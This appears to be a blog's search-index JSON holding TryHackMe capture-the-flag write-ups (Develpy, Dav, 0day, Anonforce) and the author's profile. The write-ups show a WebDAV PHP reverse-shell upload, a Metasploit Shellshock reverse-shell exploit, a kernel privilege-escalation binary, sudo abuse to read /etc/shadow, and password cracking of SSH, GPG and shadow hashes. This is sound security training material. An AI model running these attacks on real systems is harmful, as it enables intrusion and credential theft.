2 king king 4096 Aug 25 2019 .cache -rwxrwxrwx 1 king king 272113 Aug 27 2019 credentials.png -rwxrwxrwx 1 king king 408 Aug 25 2019 exploit.py drwxrwxr-x 2 king king 4096 Aug 25 2019 .nano -rw-rw-r-- 1 king king 5 Feb 23 17:12 .pid -rw-r--r-- 1 king king 655 Aug 25 2019 .profile -rw-r--r-- 1 root root 32 Aug 25 2019 root.sh -rw-rw-r-- 1 king king 139 Aug 25 2019 run.sh -rw-r--r-- 1 king king 0 Aug 25 2019 .sudo_as_admin_successful -rw-rw-r-- 1 king king 33 Aug 27 2019 user.txt -rw-r--r-- 1 root root 183 Aug 25 2019 .wget-hsts Next thing is remove the [root.sh](http://root.sh) file and then create a new file and add reverse shell in that file.\nAnd boom we for the root!\n1 2 3 4 root@ubuntu:/home/king# cat /root/root.txt cat /root/root.txt 9c37646777a53910a347f387dce025ec root@ubuntu:/home/king# ","description":"boot2root machine for FIT and bsides Guatemala CTF","id":10,"section":"posts","tags":["TryHackMe","pyjail","cronjob"],"title":"TryHackMe Writeup - Develpy Room","uri":"https://g4nd1v.github.io/posts/tryhackme-develpy/"},{"content":" Title https://tryhackme.com/room/bsidesgtdav Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 └─$ nmap -sC -sV -oA nmap/dav 10.10.88.48 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 18:51 EST Nmap scan report for 10.10.88.48 Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . So basically only one port is open, that is 80 .\nAlso, on this port there is a default page of apache2.\nNext logical step will be to search for directories.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 └─$ gobuster dir -u 10.10.88.48 -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.88.48 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.hta (Status: 403) [Size: 290] /.htaccess (Status: 403) [Size: 295] /.htpasswd (Status: 403) [Size: 295] /index.html (Status: 200) [Size: 11321] /server-status (Status: 403) [Size: 299] /webdav (Status: 401) [Size: 458] We found a directory named as /webdav but it is asking for username and password.\nAfter searching through internet about webdav, I found default credentials - https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html\nuser: wampp\npass: xampp\nUser flag I found a file passwd.dav on server and in that file, I found this credentials\nwampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91 but I cannot be able to crack it.\nI found a blog which is about exploiting webdav - https://vk9-sec.com/exploiting-webdav/ and uploading the rev shell using php.\n1 2 3 4 5 6 7 8 └─$ cadaver http://10.10.188.137/webdav Authentication required for webdav on server `10.10.188.137\u0026#39;: Username: wampp Password: dav:/webdav/\u0026gt; ls Listing collection `/webdav/\u0026#39;: succeeded. passwd.dav 44 Aug 25 2019 dav:/webdav/\u0026gt; put php-reverse-shell.php On visiting the website, we got the shell!!\n1 2 3 4 5 6 7 8 9 10 11 $ whoami www-data $ cd /home $ ls merlin wampp $ cd merlin $ ls user.txt $ cat user.txt 449b40fe93f78a938523b7e4dcd66d2a Root flag we can use /bin/cat as sudo user.\n1 2 3 4 5 6 7 8 www-data@ubuntu:/home/merlin$ sudo -l sudo -l Matching Defaults entries for www-data on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/cat Here is the /etc/shadow file and I have tried to use john in order to crack this hash. But it is of no use. Then I remember… we have cat as root.\nSimply reading root file will also work!\n1 2 3 www-data@ubuntu:/$ sudo cat /root/root.txt sudo cat /root/root.txt 101101ddc16b0cdf65ba0b8a7af7afa5 ","description":"boot2root machine for FIT and bsides guatemala CTF","id":11,"section":"posts","tags":["TryHackMe","Apache","Webdav"],"title":"TryHackMe Writeup - Dav Room","uri":"https://g4nd1v.github.io/posts/tryhackme-dav/"},{"content":"I am Krishnan Navadia (g4nd1v), a passionate cybersecurity enthusiast and software developer based in NYC, USA. Currently pursuing a Master\u0026rsquo;s degree in Cybersecurity at New York University, I have a strong foundation in Information Technology from G.H. Patel College of Engineering and Technology, India.\nEducation New York University, Brooklyn, USA\nMaster of Science (MS), Cybersecurity Sept 2023 - Ongoing G.H. Patel College of Engineering and Technology, Anand, India\nBachelor of Engineering (BE), Information Technology CGPA: 9.11/10 July 2019 – May 2023 Experience WeeTech Solution Pvt Ltd., Gujarat, India Penetration Tester Intern\nJanuary 2023 – April 2023\nConducted comprehensive vulnerability assessments, identifying over 30 critical vulnerabilities. Assisted in penetration tests, resulting in a 20% boost in system security. Collaborated with teams to devise mitigation strategies, reducing threats by 25%. Frshr Technologies, Bangalore, India Software Developer Intern\nOctober 2021 – February 2022\nDeveloped REST APIs, Dashboard, and Payment system for an NFT buying/selling website. Created a cryptocurrency and stock trading simulation web app, attracting 10,000+ users in the initial month. Implemented server maintenance and NoSQL migration, reducing downtime by 40% and speeding data by 50%. Projects Fileopedia - Encrypted File Sharing System Memephile - Social Media Application BgRemover - Service made with Telegram API Trackerly - Price tracking automation Technical Skills Programming Languages: Python, C, C++, TypeScript, JavaScript, PHP, Java Frameworks, Libraries \u0026amp; Tools: React.js, Node.js, Next.js, React Native, GraphQL, Django, Flask, Git, Postman, Docker, Shell Scripting, MongoDB, MySQL, PostgreSQL, Redis Leadership and Involvement Developer, Google Developer Student Club (GDSC) Overall Co-Coordinator, IDEA Lab Developer and Logistics, Computer Science of India (CSI) and GCET Codechef Chapter Achievements Secured “2nd place” and “Best Use of API” in the “HackOdisha” hackathon. Top 3% in TryHackMe and Rank “Hacker” on HackTheBox. Designed and tested CTF challenges for CSAW’23. Notable ranks in CTF: Nahamcon’23, GoogleCTF’23, JerseyCTFIII’23. Received a merit-based $18000 scholarship for Masters at NYU. Feel free to reach out to me via email or connect on LinkedIn. You can also check out my projects on GitHub.\n","description":"Krishnan Navadia's profile showcasing his experience, projects, and achievements.","id":12,"section":"","tags":null,"title":"About Me","uri":"https://g4nd1v.github.io/about/"},{"content":"0day Title 0day Description Exploit Ubuntu, like a Turtle in a Hurricane Difficulty Medium Maker 0day Foothold 1 2 3 4 5 6 7 8 9 10 11 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 5720823c62aa8f4223c0b893996f499c (DSA) | 2048 4c40db32640d110cef4fb85b739bc76b (RSA) | 256 f76f78d58352a64dda213c5547b72d6d (ECDSA) |_ 256 a5b4f084b6a78deb0a9d3e7437336516 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-title: 0day |_http-server-header: Apache/2.4.7 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From nmap, we didn\u0026rsquo;t find anything interesting, therefore let\u0026rsquo;s find the directories.\n└──╼ $gobuster dir -u 0day.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://0day.thm [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/06/12 15:51:58 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/cgi-bin/] /img (Status: 301) [Size: 301] [--\u0026gt; http://0day.thm/img/] /uploads (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/uploads/] /admin (Status: 301) [Size: 303] [--\u0026gt; http://0day.thm/admin/] /css (Status: 301) [Size: 301] [--\u0026gt; http://0day.thm/css/] /js (Status: 301) [Size: 300] [--\u0026gt; http://0day.thm/js/] /backup (Status: 301) [Size: 304] [--\u0026gt; http://0day.thm/backup/] /secret (Status: 301) [Size: 304] [--\u0026gt; http://0day.thm/secret/] ... /cgi-bin (Status: 301) [Size: 305] [--\u0026gt; http://0day.thm/cgi-bin/] ... We get private RSA from /backup, let\u0026rsquo;s crack it using john.\n-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547 T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8 9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB 6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6 8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6 oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE 99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P -----END RSA PRIVATE KEY----- └──╼ $python2 /usr/share/john/ssh2john.py ./rsa_private_key \u0026gt; rsa.hash └──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ./rsa.hash ... letmein (./rsa_private_key) Then I tried to login with ssh, but I can\u0026rsquo;t. Damm it! It\u0026rsquo;s a rabbit hole.\nI am clueless now, maybe Nikto scan can help.\n└──╼ $nikto -h 0day.thm - Nikto v2.1.5 --------------------------------------------------------------------------- + Target IP: 10.10.152.56 + Target Hostname: 0day.thm + Target Port: 80 + Start Time: 2023-06-12 16:08:31 (GMT5.5) --------------------------------------------------------------------------- + Server: Apache/2.4.7 (Ubuntu) + Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192 + The anti-clickjacking X-Frame-Options header is not present. + \u0026#34;robots.txt\u0026#34; retrieved but it does not contain any \u0026#39;disallow\u0026#39; entries (which is odd). + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST + OSVDB-3092: /admin/: This might be interesting... + OSVDB-3092: /backup/: This might be interesting... + OSVDB-3268: /img/: Directory indexing found. + OSVDB-3092: /img/: This might be interesting... + OSVDB-3092: /secret/: This might be interesting... + OSVDB-3092: /cgi-bin/test.cgi: This might be interesting... ... We have checked other files, but this test.cgi is new, after checking that endpoint, in a response it said Hello World!, huh, weird.\nAfter searching on Hacktricks I tried to test it using nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 └──╼ $nmap 0day.thm -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 16:21 IST Nmap scan report for 0day.thm (10.10.152.56) Host is up (0.18s latency). PORT STATE SERVICE 80/tcp open http | http-shellshock: | VULNERABLE: | HTTP Shellshock vulnerability | State: VULNERABLE (Exploitable) | IDs: CVE:CVE-2014-6271 | This web application might be affected by the vulnerability known | as Shellshock. It seems the server is executing commands injected | via malicious HTTP headers. | | Disclosure date: 2014-09-24 | References: | http://seclists.org/oss-sec/2014/q3/685 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | http://www.openwall.com/lists/oss-security/2014/09/24/10 |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169 Now, we metasploit exploit to get the shell.\nuser flag using metasploit we can shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search shellshock # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/advantech_switch_bash_env_exec 2015-12-01 excellent Yes Advantech Switch Bash Environment Variable Code Injection (Shellshock) 1 exploit/multi/http/apache_mod_cgi_bash_env_exec 2014-09-24 excellent Yes Apache mod_cgi Bash Environment Variable Code Injection (Shellshock) 2 auxiliary/scanner/http/apache_mod_cgi_bash_env 2014-09-24 normal Yes Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner ... results ... [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 1 [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set rhosts 0day.thm rhosts =\u0026gt; 0day.thm [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set targeturi /cgi-bin/test.cgi targeturi =\u0026gt; /cgi-bin/test.cgi [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; show payloads ... results ... 27 payload/linux/x86/shell/reverse_tcp normal No Linux Command Shell, Reverse TCP Stager [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set payload 27 payload =\u0026gt; linux/x86/shell/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; set lhost 10.8.95.227 lhost =\u0026gt; 10.8.95.227 [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; show options Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD_MAX_LENGTH 2048 yes CMD max line length CVE CVE-2014-6271 yes CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278) HEADER User-Agent yes HTTP header to use METHOD GET yes HTTP method to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 0day.thm yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPATH /bin yes Target PATH for binaries used by the CmdStager RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /cgi-bin/test.cgi yes Path to CGI script TIMEOUT 5 yes HTTP read response timeout (seconds) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http: Name Current Setting Required Description ---- --------------- -------- ----------- SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on a ll addresses. SRVPORT 8080 yes The local port to listen on. Payload options (linux/x86/shell/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.8.95.227 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Linux x86 View the full module info with the info, or info -d command. [msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 10.8.95.227:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes) [*] Sending stage (36 bytes) to 10.10.152.56 [*] Command shell session 1 opened (10.8.95.227:4444 -\u0026gt; 10.10.152.56:48442) at 2023-06-12 16:32:43 +0530 id uid=33(www-data) gid=33(www-data) groups=33(www-data) whoami www-data 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 shell [*] Trying to find binary \u0026#39;python\u0026#39; on the target machine [*] Found python at /usr/bin/python [*] Using `python` to pop up an interactive shell [*] Trying to find binary \u0026#39;bash\u0026#39; on the target machine [*] Found bash at /bin/bash www-data@ubuntu:/usr/lib/cgi-bin$ ls ls test.cgi www-data@ubuntu:/usr/lib/cgi-bin$ cd /home cd /home www-data@ubuntu:/home$ ls ls ryan www-data@ubuntu:/home$ cd ryan cd ryan www-data@ubuntu:/home/ryan$ ls ls user.txt www-data@ubuntu:/home/ryan$ cat user.txt cat user.txt THM{Sh3llSh0ck_r0ckz} root flag After executing linpeas, we got the exploit exploit.\ncompile exploit using gcc.\ngcc ofs.c -o ofs\nUpload to server using python -m http.server\nRun binary to get root!!\n1 2 3 4 5 6 7 8 9 10 11 12 www-data@ubuntu:/tmp$ ./ofs ./ofs spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library whoami root cat /root/root.txt THM{g00d_j0b_0day_isPleased} ","description":"Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":13,"section":"posts","tags":["TryHackMe","Shellshock","HashCracking"],"title":"TryHackMe Writeup - 0day Room","uri":"https://g4nd1v.github.io/posts/tryhackme-0day/"},{"content":"Title Title https://tryhackme.com/room/bsidesgtanonforce Description boot2root machine for FIT and bsides guatemala CTF Difficulty Easy Maker https://tryhackme.com/p/stuxnet Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 └─$ nmap -sC -sV -oA nmap/anonforce 10.10.57.47 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 20:07 EST Nmap scan report for 10.10.57.47 Host is up (0.100s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxr-xr-x 2 0 0 4096 Aug 11 2019 bin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 boot | drwxr-xr-x 17 0 0 3700 Feb 21 17:04 dev | drwxr-xr-x 85 0 0 4096 Aug 13 2019 etc | drwxr-xr-x 3 0 0 4096 Aug 11 2019 home | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img -\u0026gt; boot/initrd.img-4.4.0-157-generic | lrwxrwxrwx 1 0 0 33 Aug 11 2019 initrd.img.old -\u0026gt; boot/initrd.img-4.4.0-142-generic | drwxr-xr-x 19 0 0 4096 Aug 11 2019 lib | drwxr-xr-x 2 0 0 4096 Aug 11 2019 lib64 | drwx------ 2 0 0 16384 Aug 11 2019 lost+found | drwxr-xr-x 4 0 0 4096 Aug 11 2019 media | drwxr-xr-x 2 0 0 4096 Feb 26 2019 mnt | drwxrwxrwx 2 1000 1000 4096 Aug 11 2019 notread [NSE: writeable] | drwxr-xr-x 2 0 0 4096 Aug 11 2019 opt | dr-xr-xr-x 103 0 0 0 Feb 21 17:04 proc | drwx------ 3 0 0 4096 Aug 11 2019 root | drwxr-xr-x 18 0 0 540 Feb 21 17:04 run | drwxr-xr-x 2 0 0 12288 Aug 11 2019 sbin | drwxr-xr-x 3 0 0 4096 Aug 11 2019 srv | dr-xr-xr-x 13 0 0 0 Feb 21 17:04 sys |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all. | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.95.227 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA) | 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA) |_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds Here we can see that FTP is open.\nLogin with ftp with anonymous username and empty password.\nUser Flag In /home/melodias there is a user.txt file. We have to download the file using get command.\nUsing get user.txt it will download user.txt file in current directory.\nuser.txt → 606083fd33beb1284fc51f411a706af8\nRoot Flag After surfing through different directories, I found a specific one notread and when you change your directory in notread, you will see 2 files i.e. backup.pgp and private.asc. Now, download both of the files using get command.\nFrom this article https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html we can get to know how to crack GPG private key using john.\nFirstly, convert it into hash.\n└─$ gpg2john private.asc \u0026gt; hash.hash\nThen using john we can crack the hash.\n1 2 3 4 5 6 7 8 9 10 11 12 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65536 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status xbox360 (anonforce) 1g 0:00:00:00 DONE (2024-02-21 20:21) 4.761g/s 4428p/s 4428c/s 4428C/s lawrence..sheena Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. The plaintext is xbox360.\nNow, import private.asc in gpg and then decrypt it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 └─$ gpg --import private.asc gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created gpg: key B92CD1F280AD82C2: public key \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; imported gpg: key B92CD1F280AD82C2: secret key imported gpg: key B92CD1F280AD82C2: \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; not changed gpg: Total number processed: 2 gpg: imported: 1 gpg: unchanged: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1 └─$ gpg --decrypt backup.pgp gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12 \u0026#34;anonforce \u0026lt;melodias@anonforce.nsa\u0026gt;\u0026#34; root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7::: daemon:*:17953:0:99999:7::: bin:*:17953:0:99999:7::: sys:*:17953:0:99999:7::: sync:*:17953:0:99999:7::: games:*:17953:0:99999:7::: man:*:17953:0:99999:7::: lp:*:17953:0:99999:7::: mail:*:17953:0:99999:7::: news:*:17953:0:99999:7::: uucp:*:17953:0:99999:7::: proxy:*:17953:0:99999:7::: www-data:*:17953:0:99999:7::: backup:*:17953:0:99999:7::: list:*:17953:0:99999:7::: irc:*:17953:0:99999:7::: gnats:*:17953:0:99999:7::: nobody:*:17953:0:99999:7::: systemd-timesync:*:17953:0:99999:7::: systemd-network:*:17953:0:99999:7::: systemd-resolve:*:17953:0:99999:7::: systemd-bus-proxy:*:17953:0:99999:7::: syslog:*:17953:0:99999:7::: _apt:*:17953:0:99999:7::: messagebus:*:18120:0:99999:7::: uuidd:*:18120:0:99999:7::: melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7::: sshd:*:18120:0:99999:7::: ftp:*:18120:0:99999:7::: Copy this shadow file in shadow.txt and the using john we can decrypt the password for root.\n1 2 3 4 5 6 7 8 9 10 11 12 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt Warning: only loading hashes of type \u0026#34;sha512crypt\u0026#34;, but also saw type \u0026#34;md5crypt\u0026#34; Use the \u0026#34;--format=md5crypt\u0026#34; option to force loading hashes of that type instead Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hikari (root) 1g 0:00:00:13 DONE (2024-02-21 20:35) 0.07293g/s 490.1p/s 490.1c/s 490.1C/s oblivion..BITCH Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Root password is hikari.\nUsing ssh we can login with root and then get the root flag using cat /root/root.txt\nFlag: f706456440c7af4187810c31c6cebdce\n","description":"boot2root machine for FIT and bsides guatemala CTF","id":14,"section":"posts","tags":["TryHackMe","FTP","John-The-Ripper"],"title":"TryHackMe Writeup - Anonforce Room","uri":"https://g4nd1v.github.io/posts/tryhackme-anonforce/"}]